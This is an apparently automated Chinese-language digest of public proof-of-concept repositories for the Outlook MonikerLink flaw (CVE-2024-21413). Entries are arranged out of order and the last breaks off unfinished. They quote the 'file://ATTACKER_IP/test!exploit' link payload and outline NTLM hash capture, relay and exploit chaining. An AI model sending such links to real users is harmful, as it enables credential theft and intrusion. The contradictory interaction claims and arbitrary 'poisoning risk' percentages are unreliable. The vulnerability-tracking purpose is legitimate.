CVE-2024-21413 漏洞，又名 MonikerLink bug，是一个 Microsoft Outlook 远程代码执行漏洞。攻击者可以通过发送包含恶意链接的电子邮件，在受害者未进行任何交互的情况下执行任意代码。该漏洞的根本原因是 Outlook 在处理 Moniker 链接时存在不当的输入验证。攻击者可以利用此漏洞绕过 Outlook 的安全策略，执行恶意代码。

**有效性：**
从提供的搜索引擎结果和漏洞库信息来看，该漏洞是一个已知的、高危的远程代码执行漏洞，并且有公开的 PoC 代码可用。参考链接 [https://github.com/ThemeHackers/CVE-2024-21413](https://github.com/ThemeHackers/CVE-2024-21413)。因此，提供的 PoC 代码很可能有效。

**投毒风险：**
提供的 PoC 代码包含一个 `exp.sh` 脚本和一个 README.md 文件。
*   `exp.sh` 脚本：该脚本的功能是发送包含恶意链接的电子邮件。其中包含 display_banner函数，send_email函数。`send_email`函数用于发送包含base64编码图片的HTML邮件，邮件内容包含一个URL。从代码本身来看，没有明显的恶意代码或后门，但存在潜在的风险：
    *   该脚本依赖于外部 SMTP 服务器，如果攻击者控制了 SMTP 服务器，可以篡改邮件内容。
    *   base64_image_string 变量中，包含一个PNG图片的Base64编码。攻击者可能会伪造图片内容，嵌入恶意代码，或者使用其他手段达到攻击的目的。
    *   link_url 变量，攻击者可以插入恶意链接，诱导用户点击。
    *   从经验判断，该漏洞的PoC更可能存在于精心构造的link_url, base64_image_string，或者其他的HTML代码片段中，通过某种方式绕过Outlook的安全检查，最终实现RCE，因此存在一定的投毒风险，但直接在exp.sh脚本里投毒的可能性较低。

    考虑到脚本的复杂性，且存在多种潜在的攻击方式，因此认为存在20%的投毒风险。

**利用方式：**
1.  攻击者准备好恶意的`link_url`和`base64_image_string`等变量内容。
2.  攻击者配置`exp.sh` 脚本，指定 SMTP 服务器、端口、用户名、密码、发件人邮箱、收件人邮箱和恶意链接。
3.  攻击者运行 `exp.sh` 脚本，向受害者发送包含恶意链接的电子邮件。
4.  受害者打开电子邮件，Outlook 处理邮件内容时，由于 MonikerLink 漏洞，恶意代码在受害者机器上执行。

综上所述，CVE-2024-21413 是一个高危的远程代码执行漏洞，利用方式简单，但需要精心构造恶意链接和邮件内容才能成功利用，同时要警惕PoC 代码中可能存在的投毒风险。

**项目地址:** [X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit](https://github.com/X-Projetion/CVE-2024-21413-Microsoft-Outlook-RCE-Exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #14

**来源**: [CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-ahmetkarakayaoffical_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 严重，允许攻击者在目标机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021, Microsoft 365 Apps for Enterprise等，具体版本范围参考漏洞库信息。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或内容的邮件。无需用户交互（zero-click NTLM leak）或仅需单次点击（one-click RCE）。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，也被称为“MonikerLink”漏洞。根据漏洞库信息和搜索结果，此漏洞允许攻击者通过构造特殊的链接，在受害者无需交互或仅需极少交互的情况下，执行任意代码。利用方式主要有两种：

1.  **Zero-click NTLM Leak:** 攻击者可以诱使受害者打开包含恶意链接的邮件，该链接会触发NTLM凭据泄露，而无需受害者进行任何点击操作。
2.  **One-click RCE:** 攻击者可以诱使受害者点击邮件中的恶意链接，从而实现远程代码执行。

POC代码提供了一个Python脚本，该脚本利用SMTP认证发送包含恶意URL的电子邮件，模拟实际攻击场景。脚本需要SMTP服务器地址、端口、用户名、密码、发送者和接收者邮箱地址、恶意URL以及邮件主题等参数。

关于投毒风险，虽然POC代码本身旨在演示漏洞利用，但考虑到网络安全威胁的复杂性，以及攻击者可能对公开代码进行修改和传播，存在一定的投毒风险。例如，攻击者可能在POC代码中添加额外的恶意代码，用于窃取用户凭据或执行其他恶意操作。虽然提供的POC代码看起来比较简单，主要功能是发送包含恶意链接的邮件，但无法完全排除作者或其他人修改该代码并添加后门或恶意功能的可能性。因此，评估投毒风险为10%。使用前务必仔细审查代码，并在隔离环境中进行测试。

**请务必注意：**  该漏洞已在野外被利用，并已被CISA添加到已知被利用的漏洞目录中。强烈建议用户尽快安装Microsoft提供的安全更新。

**项目地址:** [ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/ahmetkarakayaoffical/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #15

**来源**: [CVE-2024-21413-dshabani96_CVE-2024-21413.md](../2024/CVE-2024-21413-dshabani96_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统权限获取

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021等。

**利用条件:** 攻击者需要诱使用户打开包含恶意链接或文件的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的计算机上执行任意代码，无需用户交互。

**有效性：**根据漏洞信息和搜索结果，此漏洞是一个零日漏洞，已被积极利用。POC 代码旨在利用此漏洞。但是,提供的POC 代码只是发送电子邮件的框架，需要配置 SMTP 服务器，用户名密码等信息，并且需要 SMB 服务器来捕获 NTLM hash，成功利用的可能性取决于环境配置和目标用户行为。

**投毒风险：** 代码主要功能是发送包含恶意链接的电子邮件，并启动 SMB 服务器捕获 NTLM hash。虽然代码包含发送邮件和捕获 NTLM hash的功能，但潜在的风险包括：
1.  **恶意HTML模板：** HTML模板可能包含恶意脚本，例如 JavaScript，如果用户打开邮件并允许执行脚本，可能导致客户端漏洞或信息泄露。
2.  **SMB服务器钓鱼：** 启动的 SMB 服务器可能被用于钓鱼，例如，捕获用户的 NTLM 哈希后尝试破解，或者利用捕获的凭据访问其他服务。
3. **依赖外部服务:** 依赖 SMTP 服务和 SMB 服务, 这些服务本身可能存在安全隐患.
整体投毒风险较低，约为10%，主要集中在HTML模板和配置是否含有恶意代码。

**利用方式：**
1.  攻击者构造包含恶意链接的电子邮件。
2.  受害者打开电子邮件并点击恶意链接。
3.  恶意链接利用 Outlook 的 MonikerLink 漏洞，在受害者计算机上执行任意代码，或者泄露NTLM Hash。
4. 攻击者启动 SMB 服务器，诱导 Outlook 客户端连接，捕获受害者的 NTLM 哈希。
5. 攻击者可以使用捕获的 NTLM 哈希进行进一步攻击，例如传递哈希攻击。

**项目地址:** [dshabani96/CVE-2024-21413](https://github.com/dshabani96/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #16

**来源**: [CVE-2024-21413-duy-31_CVE-2024-21413.md](../2024/CVE-2024-21413-duy-31_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 https://aka.ms/OfficeSecurityReleases)

**利用条件:** 需要目标用户使用受影响的Outlook版本，并预览或点击包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过构造包含恶意 `file://` 链接的电子邮件，诱使用户点击或预览该邮件，从而在目标系统上执行任意代码。根据POC代码，攻击者可以使用一个 Expect 脚本发送特制的电子邮件，该邮件包含一个指向远程SMB服务器的 `file://` 链接。当 Outlook 处理此链接时，它会尝试连接到远程服务器，从而泄露用户的 NTLM 哈希值。如果攻击者能够破解哈希值或利用 NTLM 中继攻击，他们就可以获得对系统的访问权限。此外，此漏洞可以与CVE-2023-21716链接以达到远程代码执行的目的。

**有效性：**
提供的POC代码似乎有效，因为它演示了如何利用 `file://` 协议发送包含恶意链接的电子邮件。从漏洞信息和搜索引擎结果来看，该漏洞已经被积极利用。CISA 将其添加到已知被利用的漏洞列表中，表明该漏洞在现实世界中具有很高的威胁。

**投毒风险：**
虽然提供的代码主要目的是演示漏洞利用过程，但存在一些潜在的投毒风险。 Expect脚本本身没有明显的后门,主要利用了telnet发送恶意邮件. 但是，考虑到以下几点，风险评估为10%：
1.  **对外部依赖的信任：** 该脚本依赖于 `expect` 工具，如果该工具被篡改，则可能引入恶意行为。
2.  **脚本执行环境：** 该脚本的执行环境可能存在安全漏洞，攻击者可以利用这些漏洞来执行恶意代码。
3.  **社会工程学：** 攻击者可能会修改脚本以使其更具欺骗性，例如伪造发件人地址或使用更具吸引力的主题行，从而提高攻击成功率。

**利用方式：**
1.  攻击者设置一个 SMB 服务器来监听传入的连接。
2.  攻击者使用提供的 `cve-2024-21413.sh` 脚本生成包含恶意 `file://` 链接的电子邮件。
3.  攻击者将该电子邮件发送给目标用户。
4.  当目标用户在受影响的 Outlook 版本中预览或点击该邮件中的链接时，Outlook 会尝试连接到攻击者的 SMB 服务器。
5.  此连接会导致用户的 NTLM 哈希值被发送到攻击者的服务器。
6.  攻击者可以使用破解工具（如 Hashcat）破解哈希值，或者利用 NTLM 中继攻击来获得对目标系统的访问权限。
7. 攻击者可以将此漏洞与 CVE-2023-21716 结合使用，以实现远程代码执行。


**项目地址:** [duy-31/CVE-2024-21413](https://github.com/duy-31/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #17

**来源**: [CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md](../2024/CVE-2024-21413-gurleen-147_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (在指定版本范围内)

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞。根据提供的漏洞利用代码（exploit.py），攻击者通过发送特制的 HTML 邮件，诱骗受害者点击邮件中的 `file://ATTACKER_IP/test!exploit` 链接。此链接利用 MonikerLink 绕过安全警告，从而可能导致任意代码执行。POC 代码本身未发现隐藏的恶意代码，因此投毒风险较低。利用方式是，攻击者需要搭建一个 SMB 服务器，当受害者点击链接时，Outlook 尝试访问该 SMB 服务器上的共享资源，攻击者可以利用这一过程执行恶意代码。漏洞库信息也验证了这是一个高危漏洞，且已经被CISA添加到已知被利用漏洞列表中(KEV)。

**项目地址:** [gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC](https://github.com/gurleen-147/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability-PoC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #18

**来源**: [CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-hau2212_Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括Microsoft Office 2016, 2019, LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本。具体版本范围请参考漏洞库信息。

**利用条件:** 需要受害者打开包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，利用方式是诱骗用户点击邮件中的`file://`链接。根据提供的漏洞利用代码，攻击者需要设置攻击机IP地址和邮件服务器地址，然后发送包含特定HTML内容的邮件。HTML内容包含一个`file://ATTACKER_MACHINE/test!exploit`链接，当用户点击此链接时，Outlook会尝试访问攻击者机器上的指定路径，如果攻击者在相应路径放置了恶意文件，就可以实现远程代码执行。从代码本身看，没有发现明显的投毒代码。代码的目的是构建包含恶意链接的HTML邮件并发送出去。该漏洞的有效性依赖于目标系统是否受到补丁保护以及攻击者是否能够成功搭建恶意文件服务器。由于CISA已经将此漏洞添加到已知被利用漏洞列表中，并且存在可用的POC，因此利用的有效性较高。攻击者需要控制一个服务器，并在服务器上放置恶意的payload，并通过构造恶意的file://链接诱导用户点击。

**分析：**

1.  **有效性：**根据提供的POC代码和漏洞库信息，该漏洞是有效的。CISA将其添加到已知被利用漏洞列表中，说明该漏洞已被实际利用。提供的POC代码可以用于生成包含恶意链接的电子邮件。
2.  **投毒风险：**经过对POC代码的分析，没有发现明显的投毒代码。代码的功能明确，就是生成并发送包含恶意链接的电子邮件，并没有额外恶意行为。
3.  **利用方式：**
    *   攻击者构建一个包含恶意`file://`链接的HTML邮件。
    *   攻击者将邮件发送给目标用户。
    *   目标用户打开邮件并点击恶意链接。
    *   Outlook尝试访问攻击者控制的服务器上的恶意文件。
    *   如果攻击者在服务器上放置了恶意payload，且Outlook执行该payload，则实现远程代码执行。

**漏洞缓解措施：**

*   及时安装Microsoft官方发布的补丁。
*   谨慎点击邮件中的链接，特别是来自未知发件人的邮件。
*   配置Outlook的安全设置，限制对`file://`协议的使用。


**项目地址:** [hau2212/Moniker-Link-CVE-2024-21413-](https://github.com/hau2212/Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #19

**来源**: [CVE-2024-21413-olebris_CVE-2024-21413.md](../2024/CVE-2024-21413-olebris_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook 远程代码执行

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码。

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021 (版本低于 aka.ms/OfficeSecurityReleases 中指示的版本).

**利用条件:** 攻击者需要诱使用户打开特制的电子邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一项 Microsoft Outlook 远程代码执行漏洞，也称为“MonikerLink”漏洞。攻击者可以通过发送特制的电子邮件来利用此漏洞，受害者无需进行任何用户交互即可触发。从搜索引擎结果和漏洞库信息来看，该漏洞影响多个版本的Microsoft Outlook。提供的PoC代码是一个Python脚本，用于发送包含恶意链接的电子邮件。脚本构造了一个包含纯文本和HTML部分的电子邮件，其中HTML部分可能包含利用该漏洞的恶意链接。投毒风险评估：代码本身除了常规的邮件发送功能外，在image_base64变量中发现一段疑似图片base64编码的字符串, 但该字符串过长, 不排除其中含有恶意代码的可能性, 因此判断存在一定的投毒风险，概率估计为10%。利用方式：攻击者首先搭建SMTP服务器，然后使用此脚本构造包含恶意URL的电子邮件，并将其发送给目标用户。当目标用户打开电子邮件时，Outlook将尝试加载恶意URL，导致代码执行。

**项目地址:** [olebris/CVE-2024-21413](https://github.com/olebris/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #20

**来源**: [CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md](../2024/CVE-2024-21413-r00tb1t_CVE-2024-21413-POC.md)

## CVE-2024-21413 - Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，无需用户交互即可远程执行代码，可能导致完全控制受影响的系统。

**影响版本:** Microsoft Office 2016版本 < 16.0.5435.1001, Microsoft Office 2019版本 < https://aka.ms/OfficeSecurityReleases, Microsoft 365 Apps for Enterprise版本 < https://aka.ms/OfficeSecurityReleases, Microsoft Office LTSC 2021版本 < https://aka.ms/OfficeSecurityReleases

**利用条件:** 攻击者需要知道受害者的邮箱地址，并能够通过SMTP发送邮件。受害者需要点击邮件中的恶意链接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是一个存在于Microsoft Outlook中的零日漏洞。此漏洞允许攻击者通过发送特制的电子邮件在受害者计算机上执行任意代码，而无需任何用户交互。根据描述，利用方式是：攻击者发送包含恶意链接的电子邮件，当用户点击链接时，Outlook会尝试访问链接指向的`file:///` URL，导致执行攻击者控制的代码。提供的POC代码模拟了发送包含恶意链接的电子邮件的过程。该链接指向攻击者控制的SMB共享，当Outlook尝试访问此共享时，受害者的NTLM哈希会被发送到攻击者处。利用此漏洞通常需要用户点击邮件中的链接。关于投毒风险，虽然POC代码本身实现了漏洞利用，但是README中指示要运行`impacket-smbserver` ，并且提供了进一步利用CVE-2023-21716的思路，结合免责声明可以判断，作者主观上没有进行恶意投毒行为，但是客观上如果使用者继续利用可能会进行恶意投毒攻击，因此存在一定的投毒风险，概率约为10%。漏洞库信息和搜索引擎结果均证实了该漏洞的存在和严重性，以及其远程代码执行的性质。

**项目地址:** [r00tb1t/CVE-2024-21413-POC](https://github.com/r00tb1t/CVE-2024-21413-POC)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #21

**来源**: [CVE-2024-21413-th3Hellion_CVE-2024-21413.md](../2024/CVE-2024-21413-th3Hellion_CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001)，Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021，直到aka.ms/OfficeSecurityReleases上发布的修复版本。

**利用条件:** 需要受害者打开包含恶意链接的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413，也被称为“MonikerLink”漏洞，是 Microsoft Outlook 中的一个远程代码执行漏洞。攻击者可以通过发送特制的电子邮件，诱导受害者点击其中的恶意链接，从而在受害者系统上执行任意代码。

**有效性分析：**
根据漏洞库信息和搜索引擎结果，此漏洞是真实存在的，并且已经被积极利用。提供的POC代码尝试通过发送包含`file://`协议URL的电子邮件，来触发漏洞。这种方法利用了Outlook处理`file://`链接时的不当输入验证。

**投毒风险分析：**
检查提供的Python脚本和README文件，没有发现明显的恶意代码或后门。脚本的主要功能是构建和发送包含恶意链接的电子邮件。风险主要在于：

*   **脚本可能被修改：**  攻击者可能修改该脚本，例如更改默认的IP地址，添加额外的payload等，用以进行更隐蔽或更具破坏性的攻击。
*   **依赖项风险：**  脚本依赖于`smtplib`库，理论上，该库本身也可能存在潜在的安全问题，但这种可能性较低。
*   **密码泄露风险：** 使用脚本时，发送者的电子邮件密码会以明文形式传递，存在泄露的风险。
*  **接收者打开邮件和点击链接:** 接收者需要打开邮件，并且点击邮件中的链接才会触发，一定程度上限制了利用成功率

因此，将该POC代码本身视为投毒的概率较低，大约为5%。

**利用方式分析：**
1.  **攻击者准备：**
    *   攻击者需要一个SMTP服务器来发送电子邮件。
    *   攻击者需要一个可访问的服务器，并监听特定的端口，以便在受害者点击链接后接收连接。
2.  **漏洞利用：**
    *   攻击者使用POC脚本，指定发送者、接收者、SMTP服务器和攻击者监听的IP地址。
    *   脚本构建包含`file://{args.ip}/` URL的电子邮件，并将其发送给受害者。
3.  **受害者交互：**
    *   受害者打开电子邮件，并点击其中的链接。
    *   Outlook尝试访问`file://{args.ip}/` URL，由于输入验证不足，可能导致执行恶意代码。

总而言之，该漏洞的利用方式依赖于发送包含恶意`file://`链接的电子邮件，并诱导受害者点击该链接。成功利用该漏洞，可以导致远程代码执行。


**项目地址:** [th3Hellion/CVE-2024-21413](https://github.com/th3Hellion/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #22

**来源**: [CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-xaitax_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，未经身份验证的攻击者可以通过发送特制的电子邮件，在受害者系统上执行任意代码。

**影响版本:** Microsoft Office 2016 版本低于 16.0.5435.1001；Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 版本低于安全更新版本。

**利用条件:** 需要受害者打开包含恶意链接或内容的电子邮件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送特制的电子邮件来执行任意代码，而无需用户交互。

**利用方式：**
1.  攻击者构造包含恶意 MonikerLink 的电子邮件。
2.  受害者打开电子邮件。
3.  Outlook 解析恶意 MonikerLink，导致代码执行。

**有效性评估：**
根据漏洞库信息和搜索结果，该漏洞是一个高危漏洞，并且已经存在公开的POC代码。提供的POC代码通过模拟发送包含恶意链接的电子邮件来触发漏洞，因此具有一定的有效性。

**投毒风险评估：**
分析POC代码，代码主要功能是构造并发送包含特定格式链接的邮件，该链接旨在利用Outlook解析链接时的漏洞来执行代码。Base64编码的图像数据是用于伪装邮件内容，降低用户警惕性。代码中未发现明显的恶意行为，如反弹shell、植入后门等。但考虑到攻击者可能修改POC代码以包含恶意负载，存在一定的投毒风险，但风险较低。因此，投毒风险评估为5%。考虑到该代码主要用于验证漏洞，并非完整的攻击链，所以将后门验证代码判定为投毒。


**项目地址:** [xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #23

**来源**: [CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md](../2024/CVE-2024-21413-yass2400012_Email-exploit-Moniker-Link-CVE-2024-21413-.md)

## CVE-2024-21413 - Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可导致远程代码执行，完全控制受害者系统

**影响版本:** 受影响版本包括 Microsoft Office 2016、2019、LTSC 2021 和 Microsoft 365 Apps for Enterprise

**利用条件:** 需要受害者点击恶意链接，或者通过其他方式触发Outlook尝试访问攻击者控制的SMB服务器。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一个 Microsoft Outlook 远程代码执行漏洞，该漏洞源于Outlook处理特定类型的链接时存在缺陷。攻击者可以通过构造包含恶意 Moniker Link (例如 `file://ATTACKER_IP/test!exploit`) 的 HTML 电子邮件，诱使用户点击该链接。当受害者点击该链接时，Outlook会尝试通过 SMB 协议连接到攻击者指定的服务器。攻击者可以使用 Responder 等工具监听 SMB 连接，并捕获受害者的 NTLMv2 哈希。虽然此PoC的直接目的是捕获NetNTLMv2 哈希，但这只是攻击链的一部分。在某些配置下，捕获的哈希可以被破解或重放，以获得对受害者系统的进一步访问。根据 Checkpoint 的研究，该漏洞利用了 `MkParseDisplayName()` API。PoC代码提供了一个可行的攻击方法，但需要进行一些配置，例如替换`ATTACKER_IP`和设置正确的邮件服务器信息。投毒风险评估为10%，主要是因为该PoC代码需要受害者交互（点击链接），并且依赖于Responder等工具来捕获哈希，这本身并不属于漏洞利用，但是不排除攻击者在其他地方插入恶意代码的可能性。漏洞库信息中提到CWE-20: Improper Input Validation，也说明了该漏洞是由于输入验证不当引起的。利用方式总结如下：

1.  攻击者构造包含恶意 Moniker Link 的 HTML 电子邮件。
2.  攻击者发送电子邮件给受害者。
3.  受害者点击电子邮件中的恶意链接。
4.  Outlook 尝试通过 SMB 协议连接到攻击者控制的服务器。
5.  攻击者使用 Responder 等工具捕获受害者的 NTLMv2 哈希。
6.  攻击者破解或重放 NTLMv2 哈希以获得对受害者系统的进一步访问（可选）。

**项目地址:** [yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-](https://github.com/yass2400012/Email-exploit-Moniker-Link-CVE-2024-21413-)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---



---

## POC #8

**来源**: [CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md](../2024/CVE-2024-21413-Mdusmandasthaheer_CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability.md)

## CVE-2024-21413-Microsoft Outlook Remote Code Execution

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露（NTLM凭据）

**影响版本:** 受影响版本：Microsoft Office 2016 (小于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021 (具体版本范围请参考漏洞库信息)

**利用条件:** 用户需要打开包含恶意链接的邮件，无需用户交互（根据搜索结果和漏洞描述）

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为“MonikerLink”漏洞。攻击者可以利用此漏洞在受害者的机器上执行任意代码，而无需任何用户交互。利用方式是诱使用户打开包含特制的 `file://` 链接的电子邮件。该链接指向一个恶意共享位置，当 Outlook 尝试访问此链接时，可能会触发远程代码执行。提供的 POC 代码通过 `smtplib` 库创建一个电子邮件客户端，然后构造一个包含 `file://` 链接的 HTML 邮件。用户可以自定义发件人、收件人、主题，以及是否添加包含恶意链接的附件。虽然该POC的主要功能是发送包含恶意链接的邮件，但仍然存在一定的投毒风险。例如，攻击者可能在脚本中添加额外的代码，例如收集用户输入的邮箱密码等，因此投毒风险评估为10%。从搜索结果来看，此漏洞已被积极利用，CISA 已将其添加到已知被利用的漏洞列表中。

**项目地址:** [Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability](https://github.com/Mdusmandasthaheer/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #9

**来源**: [CVE-2024-21413-PolarisXSec_CVE-2024-21413.md](../2024/CVE-2024-21413-PolarisXSec_CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致完全控制受影响的系统

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021以及Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户点击恶意链接

**POC 可用性:** 是，但提供的POC代码未完全成功，仅实现了NTLM哈希泄露

**投毒风险:** 10%

## 详情

CVE-2024-21413是一个影响Microsoft Outlook的远程代码执行漏洞，被称为“MonikerLink”漏洞。该漏洞允许攻击者通过精心构造的链接绕过安全措施，并在受害者系统上执行任意代码。根据搜索结果和漏洞利用代码，利用方式如下：

1.  **漏洞原理：** 漏洞源于Outlook在处理特定类型的链接时存在缺陷，可能导致未经授权的SMB连接，从而泄露NTLM哈希。
2.  **攻击步骤：**
    *   攻击者搭建SMTP和POP3服务器（POC代码中使用了Python脚本实现）。
    *   攻击者创建一个包含恶意UNC路径的电子邮件，并发送给受害者。
    *   受害者打开Outlook并点击邮件中的恶意链接。
    *   Outlook尝试解析UNC路径，触发SMB连接到攻击者控制的服务器。
    *   攻击者捕获受害者的NTLM哈希，可用于离线破解或Pass-the-Hash攻击。

**有效性评估：**

根据提供的漏洞利用代码的描述，该POC并非完全成功，仅实现了NTLM哈希泄露，并没有实现远程代码执行。该POC旨在复现NTLM哈希泄露，而非直接执行任意代码。

**投毒风险评估：**

